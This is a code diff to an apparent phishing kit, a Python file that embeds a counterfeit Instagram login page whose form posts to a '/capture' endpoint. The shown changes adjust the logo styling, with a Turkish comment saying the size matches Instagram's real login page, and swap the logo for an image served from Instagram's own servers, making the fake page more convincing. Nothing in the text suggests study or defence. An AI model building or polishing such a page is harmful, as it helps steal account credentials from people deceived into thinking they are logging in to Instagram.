@@ -81,9 +81,7 @@ INSTAGRAM_HTML = '''<!DOCTYPE html>
   text-align: center;
 }
 .logo img {
-  height: 51px;
-  display: block;
-  margin: 0 auto;
+  height: 51px; /* Instagram login sayfasındaki boyuta yakın */
 }
     .input-group {
       margin-bottom: 14px;
@@ -197,7 +195,7 @@ INSTAGRAM_HTML = '''<!DOCTYPE html>
     <div>
       <div class="login-card">
         <div class="logo">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagramlogo2016.svg" alt="Instagram" />
+  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" />
 </div>
 
         <form id="loginForm" action="/capture" method="POST">
